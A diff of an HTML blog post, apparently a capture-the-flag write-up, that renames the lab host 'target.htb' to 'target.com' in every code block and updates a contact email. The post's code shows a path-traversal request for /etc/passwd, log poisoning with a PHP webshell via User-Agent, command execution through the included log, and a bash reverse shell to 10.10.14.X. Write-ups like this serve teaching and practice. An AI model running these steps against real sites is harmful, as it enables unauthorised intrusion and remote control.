@@ -60,7 +60,7 @@
           around — just the usual:
         </p>
 
-        <pre><code>nmap -sV -sC -p- target.htb</code></pre>
+        <pre><code>nmap -sV -sC -p- target.com</code></pre>
 
         <p>
           Only port 80 open. The thing that caught my eye immediately was the URL structure.
@@ -77,7 +77,7 @@
         </p>
 
         <pre><code>GET /index.php?page=../../../../etc/passwd HTTP/1.1
-Host: target.htb</code></pre>
+Host: target.com</code></pre>
 
         <p>
           And there it was. Full <code>/etc/passwd</code> dumped right into the page response.
@@ -114,14 +114,14 @@ Host: target.htb</code></pre>
         </p>
 
         <pre><code># Step 1: Inject PHP into the log via User-Agent
-curl -s "http://target.htb/" -A '&lt;?php system($_GET["cmd"]); ?&gt;'</code></pre>
+curl -s "http://target.com/" -A '&lt;?php system($_GET["cmd"]); ?&gt;'</code></pre>
 
         <p>
           Then triggered execution by including the log and passing a command:
         </p>
 
         <pre><code># Step 2: Execute commands through the LFI
-curl "http://target.htb/index.php?page=../../../../var/log/apache2/access.log&cmd=id"</code></pre>
+curl "http://target.com/index.php?page=../../../../var/log/apache2/access.log&cmd=id"</code></pre>
 
         <p>
           The response came back with <code>uid=33(www-data)</code> sitting right there in the
@@ -185,7 +185,7 @@ bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.X/4444 0&gt;&amp;1'</code></pre>
 
         <p class="post-article-footer">
           Find me on <a href="https://twitter.com/Al3nVettithanam" class="inline-link">Twitter</a>
-          or just shoot me an <a href="mailto:alensebastianofficial@gmail.com" class="inline-link">email</a>.
+          or just shoot me an <a href="mailto:hello@alensebastian.in" class="inline-link">email</a>.
         </p>
 
       </div>
